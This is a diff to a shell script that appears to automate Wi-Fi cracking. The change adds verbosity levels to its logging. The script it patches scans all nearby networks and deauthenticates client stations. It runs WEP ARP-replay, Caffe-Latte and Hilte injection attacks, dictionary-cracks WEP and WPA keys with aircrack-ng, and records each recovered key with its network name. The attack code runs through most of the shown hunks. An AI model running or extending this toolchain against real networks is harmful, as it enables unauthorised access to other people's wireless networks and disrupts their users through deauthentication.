@@ -171,12 +171,18 @@ h_now() {
 }
 
 h_log() {
+	local level
 	local time_now
 	local time_str
 	local t
 	local h
 	local m
 	local s
+
+	level=$1
+	shift
+
+	[ $level -le $H_OPT_VERBOSE ] || return
 	time_now=$(h_now)
 	t=$(($time_now - $H_TIME_START))
 	h=$(($t / 3600))
@@ -198,7 +204,7 @@ h_detect_small_storage() {
 	if [ $flag_big -le 0 ]
 	then
 		export H_SMALL_STORAGE=1
-		h_log "Small or no storage available, avoiding hard-disk needy applications... H_SMALL_STORAGE=$H_SMALL_STORAGE"
+		h_log 1 "Small or no storage available, avoiding hard-disk needy applications... H_SMALL_STORAGE=$H_SMALL_STORAGE"
 		H_OP_MODE_wep_attack=0
 	fi
 }
@@ -241,11 +247,11 @@ h_startup() {
 	cd $H_TMP_D >/dev/null 2>&1 \
 		|| h_error "can't use tmp directory '$H_TMP_D'"
 
-	h_log "starting"
-	h_log "using config file: $H_CONFIG_F"
-	h_log "using lib directory: $H_LIB_D"
-	h_log "using run directory: $H_RUN_D"
-	h_log "using tmp directory: $H_TMP_D"
+	h_log 0 "starting"
+	h_log 1 "using config file: $H_CONFIG_F"
+	h_log 1 "using lib directory: $H_LIB_D"
+	h_log 1 "using run directory: $H_RUN_D"
+	h_log 1 "using tmp directory: $H_TMP_D"
 
 	h_get_op_modes
 	h_detect_small_storage
@@ -271,11 +277,11 @@ h_cleanup() {
 	h_hook_call_handlers on_wifi_cleanup
 	h_hook_call_handlers on_app_ended
 
-	h_log "ended"
+	h_log 0 "ended"
 }
 
 h_abort() {
-	h_log "Caught ABORT, exiting gracefully"
+	h_log 0 "caught ABORT, exiting gracefully"
 	h_cleanup
 	exit 1
 }
@@ -294,14 +300,14 @@ h_hw_prepare() {
 	if [ -n "$plop" ]; then
 		ifconfig $H_MON_IF down
 		if [ "$H_CUR_CHANNEL" != "$H_OLD_CHANNEL" ]; then
-			h_log "switching to channel: $H_CUR_CHANNEL"
+			h_log 1 "switching to channel: $H_CUR_CHANNEL"
 			iwconfig $H_MON_IF channel $H_CUR_CHANNEL
 			H_OLD_CHANNEL=$H_CUR_CHANNEL
 			h_hook_call_handlers on_channel_changed
 		fi
 		if [ "$H_CUR_RATE" != "$H_OLD_RATE" ]; then
 			[ $H_CUR_RATE -le 11 ] && rate="11M" || rate="54M"
-			h_log "ajusting bit rate to: $rate"
+			h_log 1 "ajusting bit rate to: $rate"
 			iwconfig $H_MON_IF rate $rate
 			H_OLD_RATE=$H_CUR_RATE
 			h_hook_call_handlers on_rate_changed
@@ -398,7 +404,7 @@ h_replay_stop() {
 h_capture() {
 	local cmd
 	cmd="airodump-ng $H_MON_IF $*"
-	h_log "running: $cmd"
+	h_log 2 "running: $cmd"
 	exec $cmd
 }
 
@@ -407,15 +413,10 @@ h_monitor_all() {
 	local n_wep
 	local n_wpa
 
-	h_log "monitoring traffic for $H_MONITOR_TIME_LIMIT seconds"
+	h_log 1 "monitoring *ALL* traffic for $H_MONITOR_TIME_LIMIT seconds"
 
 	ifconfig $H_MON_IF down
 	iwconfig $H_MON_IF channel 0
-
-	ifconfig $H_AP_IF >>/tmp/h.log
-	ifconfig $H_MON_IF >>/tmp/h.log
-	iwconfig $H_AP_IF >>/tmp/h.log
-	iwconfig $H_MON_IF >>/tmp/h.log
 
 	h_capture_start h_capture --write ALL ${H_OPT_BSSID:+--bssid $H_OPT_BSSID} ${H_OPT_CHANNEL:+--channel $H_OPT_CHANNEL} -f 250 --output-format=csv,kismet
 	sleep $H_MONITOR_TIME_LIMIT
@@ -436,7 +437,7 @@ h_monitor_all() {
 	n_open=$(wc -l <$H_NET_OPEN_F)
 	n_wep=$(wc -l <$H_NET_WEP_F)
 	n_wpa=$(wc -l <$H_NET_WPA_F)
-	h_log "found $n_open open, $n_wep WEP & $n_wpa WPA networks"
+	h_log 1 "found $n_open open, $n_wep WEP & $n_wpa WPA networks"
 }
 
 
@@ -453,7 +454,7 @@ h_open_try_one_network() {
 	bssid=$(h_kis_get_network_bssid $H_ALL_KIS_F $N)
 	channel=$(h_kis_get_network_channel $H_ALL_KIS_F $N)
 	essid=$(h_kis_get_network_essid $H_ALL_KIS_F $N)
-	h_log "found open network: bssid=$bssid, channel=$channel, essid='$essid'"
+	h_log 1 "found open network: bssid=$bssid, channel=$channel, essid='$essid'"
 }
 
 h_open_try_all_networks() {
@@ -475,7 +476,7 @@ h_wep_wait_for_iv() {
 	local time_elapsed
 
 	iv_min=$1
-	h_log "waiting for $iv_min IVs"
+	h_log 1 "waiting for $iv_min IVs"
 	time_start=$(h_now)
 	while [ 1 ]; do
 		sleep $H_REFRESH_DELAY
@@ -483,7 +484,7 @@ h_wep_wait_for_iv() {
 		time_elapsed=$(($time - $time_start))
 		[ $time_elapsed -ge $H_INJECTION_TIME_LIMIT ] && break
 		iv=$(h_csv_get_network_iv_count $H_CUR_CSV_F $H_CUR_BSSID)
-		h_log "got $iv IVs so far"
+		h_log 1 "got $iv IVs so far"
 		[ $iv -ge $iv_min ] && return 0
 	done
 	return 1
@@ -492,7 +493,7 @@ h_wep_wait_for_iv() {
 h_wep_log_key() {
 	local key
 	key=$(cat $H_CUR_KEY_F)
-	h_log "key found: $key"
+	h_log 0 "key found: $key  (bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID')"
 	echo "$H_CUR_BSSID,$H_CUR_ESSID,$H_CUR_CHANNEL,$key" >>$H_WEP_F
 	H_WEP_CHANNEL=$H_CUR_CHANNEL
 }
@@ -520,7 +521,7 @@ h_wep_attack_is_working() {
 		div=$(($iv - $iv_last))
 		dtime=$(($time - $time_last))
 		iv_rate=$(($div / $dtime))
-		h_log "got $iv IVs so far ($div IVs in $dtime seconds, $iv_rate IVs/s)"
+		h_log 1 "got $iv IVs so far ($div IVs in $dtime seconds, $iv_rate IVs/s)"
 		[ $iv_rate -ge $H_IV_RATE_SUCCESS ] && return 0
 		iv_last=$iv
 		time_last=$time
@@ -542,34 +543,34 @@ h_wep_attack_try() {
 	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
 	if [ -n "$clients" ]; then
 		for client in $clients; do
-			h_log "found a client station: $client"
+			h_log 1 "found a client station: $client"
 			h_auth_start h_wep_deauth -c $client
 		done
 	else
-		h_log "no client station found"
+		h_log 1 "no client station found"
 		h_auth_start h_wep_auth_fake1
 	fi
 
 	RC=1
 	if h_wep_attack_is_working; then
-		h_log "attack seems to be working \o/ :)"
+		h_log 1 "attack seems to be working \o/ :)"
 		h_hook_call_handlers on_wep_attack_working
 		while [ 1 ]; do
 			iv=$(h_csv_get_network_iv_count $H_CUR_CSV_F $H_CUR_BSSID)
 			if [ $iv -ge $H_IV_MIN ]; then
 				if [ $iv -ge $H_IV_MAX ]; then
-					h_log "max IVs limit ($H_IV_MAX) reached"
+					h_log 1 "max IVs limit ($H_IV_MAX) reached"
 					break
 				fi
 				if [ -z "$crack_time_started" ]; then
-					h_log "min IVs limit ($H_IV_MIN) reached"
+					h_log 1 "min IVs limit ($H_IV_MIN) reached"
 					h_crack_start h_wep_crack
 					crack_time_started=$(h_now)
 				else
 					local crack_time=$(h_now)
 					local crack_time_elapsed=$(($crack_time - $crack_time_started))
 					if [ $crack_time_elapsed -ge $H_CRACK_TIME_LIMIT ]; then
-						h_log "cracking time limit ($H_CRACK_TIME_LIMIT) reached"
+						h_log 1 "cracking time limit ($H_CRACK_TIME_LIMIT) reached"
 						break
 					fi
 				fi
@@ -581,7 +582,7 @@ h_wep_attack_try() {
 				break
 			fi
 			if ! h_wep_attack_is_working; then
-				h_log "attack stalled, aborting"
+				h_log 1 "attack stalled, aborting"
 				break
 			fi
 		done
@@ -604,12 +605,12 @@ h_wep_bruteforce_try() {
 	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
 	if [ -n "$clients" ]; then
 		for client in $clients; do
-			h_log "found a client station: $client"
+			h_log 1 "found a client station: $client"
 			h_auth_start h_wep_deauth -c $client
 		done
 		sleep 1
 	else
-		h_log "no client station found"
+		h_log 1 "no client station found"
 	fi
 
 	#country=$(get_country_from_ssid $H_CUR_ESSID)
@@ -617,13 +618,13 @@ h_wep_bruteforce_try() {
 
 	RC=1
 	if h_wep_wait_for_iv 4; then
-		h_log "BF can start \o/ :)"
+		h_log 1 "BF can start \o/ :)"
 		for keysize in 64 128; do
 			dicts=${H_LIB_D}/dict/${country}-wep${keysize}-???.dict
 			for dict in $dicts; do
 				[ -f $dict ] || continue
 				words=$(wc -l $dict | awk '{ print $1; }')
-				h_log "trying dict '$dict' ($words words)"
+				h_log 1 "trying dict '$dict' ($words words)"
 				h_wep_dict_crack $keysize $dict
 				if [ -f $H_CUR_KEY_F ]; then
 					h_hook_call_handlers on_wep_key_found
@@ -635,7 +636,7 @@ h_wep_bruteforce_try() {
 		done
 	fi
 	if [ $RC -gt 0 ]; then
-		h_log "BF failed"
+		h_log 1 "BF failed"
 	fi
 
 	h_auth_stop
@@ -646,7 +647,7 @@ h_wep_bruteforce_try() {
 h_wep_crack() {
 	local cmd
 	cmd="aircrack-ng -q -b $H_CUR_BSSID -l $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT"
-	h_log "running: $cmd"
+	h_log 2 "running: $cmd"
 	exec $cmd
 }
 
@@ -657,14 +658,14 @@ h_wep_dict_crack() {
 	keysize=$1
 	dictfile=$2
 	cmd="aircrack-ng -w $dictfile -n $keysize -a 1 -l $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT"
-	h_log "running: $cmd"
+	h_log 2 "running: $cmd"
 	$cmd 2>&1 >/dev/null
 }
 
 h_wep_auth() {
 	local cmd
 	cmd="aireplay-ng $H_MON_IF $*"
-	h_log "running: $cmd"
+	h_log 2 "running: $cmd"
 	exec $cmd
 }
 
@@ -700,7 +701,7 @@ h_wep_replay() {
 	if [ $H_INJECTION_RATE_LIMIT -gt 0 ]; then
 		cmd="$cmd -x $H_INJECTION_RATE_LIMIT"
 	fi
-	h_log "running: $cmd"
+	h_log 2 "running: $cmd"
 	exec $cmd
 }
 
@@ -721,25 +722,25 @@ h_wep_replay_hilte() {
 }
 
 h_wep_try_arp_replay_1() {
-	h_log "trying ARP replay attack (1)"
+	h_log 1 "trying ARP replay attack (1)"
 	h_wep_attack_try "h_wep_replay_arp1"
 	return $?
 }
 
 h_wep_try_arp_replay_2() {
-	h_log "trying ARP replay attack (2)"
+	h_log 1 "trying ARP replay attack (2)"
 	h_wep_attack_try "h_wep_replay_arp2"
 	return $?
 }
 
 h_wep_try_caffe_latte() {
-	h_log "trying Caffe-Latte"
+	h_log 1 "trying Caffe-Latte"
 	h_wep_attack_try "h_wep_replay_caffe_latte"
 	return $?
 }
 
 h_wep_try_hilte() {
-	h_log "trying Hilte"
+	h_log 1 "trying Hilte"
 	h_wep_attack_try "h_wep_replay_hilte"
 	return $?
 }
@@ -753,7 +754,7 @@ h_wep_attack() {
 	local capture_options
 	h_wep_key_found && return
 
-	h_log "trying WEP attack mode"
+	h_log 1 "trying WEP attack mode"
 
 	h_hook_call_handlers on_wep_attack_started
 	
@@ -786,12 +787,13 @@ h_wep_bruteforce() {
 	local capture_options
 	h_wep_key_found && return
 
-	h_log "trying WEP bruteforce mode"
+	h_log 1 "trying WEP bruteforce mode"
 
 	h_hook_call_handlers on_wep_bruteforce_started
 	
 	h_hw_prepare
 	
+	h_log 1 "monitoring  traffic for $H_MONITOR_TIME_LIMIT seconds"
 	if [ $H_CAPTURE_IV_ONLY -gt 0 ]; then
 		H_CUR_CAP_FEXT="ivs"
 		capture_options="--output-format=ivs,csv"
@@ -828,11 +830,11 @@ h_wep_try_one_network() {
 	H_CUR_BASE_FNAME=$(h_get_sane_fname $H_CUR_BSSID)
 
 	if h_wep_key_found; then
-		h_log "skipping known WEP network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
+		h_log 1 "skipping known WEP network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
 		return 0
 	fi
 
-	h_log "trying WEP network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
+	h_log 1 "trying WEP network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
 
 	[ "$H_OP_MODE_wep_bruteforce" = "1" ] && h_wep_bruteforce
 	[ "$H_OP_MODE_wep_attack" = "1" ] && h_wep_attack
@@ -855,12 +857,12 @@ h_wpa_dict_crack() {
 	local dictfile
 	dictfile=$1
 	cmd="aircrack-ng -w $dictfile -a 2 -l $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT"
-	h_log "running: $cmd"
+	h_log 2 "running: $cmd"
 	$cmd 2>&1 >/dev/null
 }
 
 h_wpa_wait_for_hs() {
-	h_log "waiting for WPA handshake"
+	h_log 1 "waiting for WPA handshake"
 	sleep $H_REFRESH_DELAY
 	return 0
 }
@@ -872,7 +874,7 @@ h_wpa_key_found() {
 h_wpa_key_log() {
 	local key
 	key=$(cat $H_CUR_KEY_F)
-	h_log "key found: $key"
+	h_log 0 "key found: $key (bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID')"
 	echo "$H_CUR_BSSID,$H_CUR_ESSID,$H_CUR_CHANNEL,$key" >>$H_WPA_F
 	H_WPA_CHANNEL=$H_CUR_CHANNEL
 }
@@ -887,12 +889,12 @@ h_wpa_bruteforce_try() {
 	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
 	if [ -n "$clients" ]; then
 		for client in $clients; do
-			h_log "found a client station: $client"
+			h_log 1 "found a client station: $client"
 			h_auth_start h_wep_deauth -c $client
 		done
 		sleep 1
 	else
-		h_log "no client station found"
+		h_log 1 "no client station found"
 	fi
 
 	#country=$(get_country_from_ssid $H_CUR_ESSID)
@@ -900,12 +902,12 @@ h_wpa_bruteforce_try() {
 
 	RC=1
 	if h_wpa_wait_for_hs; then
-		h_log "BF can start \o/ :)"
+		h_log 1 "BF can start \o/ :)"
 		dicts=${H_LIB_D}/dict/${country}-wpa-???.dict
 		for dict in $dicts; do
 			[ -f $dict ] || continue
 			words=$(wc -l $dict | awk '{ print $1; }')
-			h_log "trying dict '$dict' ($words words)"
+			h_log 1 "trying dict '$dict' ($words words)"
 			h_wpa_dict_crack $dict
 			if [ -f $H_CUR_KEY_F ]; then
 				h_hook_call_handlers on_wpa_key_found
@@ -916,7 +918,7 @@ h_wpa_bruteforce_try() {
 		done
 	fi
 	if [ $RC -gt 0 ]; then
-		h_log "BF failed"
+		h_log 1 "BF failed"
 	fi
 
 	h_auth_stop
@@ -928,7 +930,7 @@ h_wpa_bruteforce() {
 	local capture_options
 	h_wpa_key_found && return
 
-	h_log "trying WPA bruteforce mode"
+	h_log 1 "trying WPA bruteforce mode"
 
 	h_hook_call_handlers on_wpa_bruteforce_started
 	
@@ -960,11 +962,11 @@ h_wpa_try_one_network() {
 	H_CUR_BASE_FNAME=$(h_get_sane_fname $H_CUR_BSSID)
 
 	if h_wpa_key_found; then
-		h_log "skipping known WPA network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
+		h_log 1 "skipping known WPA network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
 		return 0
 	fi
 
-	h_log "trying WPA network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
+	h_log 1 "trying WPA network: bssid=$H_CUR_BSSID, channel=$H_CUR_CHANNEL, essid='$H_CUR_ESSID'"
 
 	[ "$H_OP_MODE_wpa_bruteforce" = "1" ] && h_wpa_bruteforce
 }
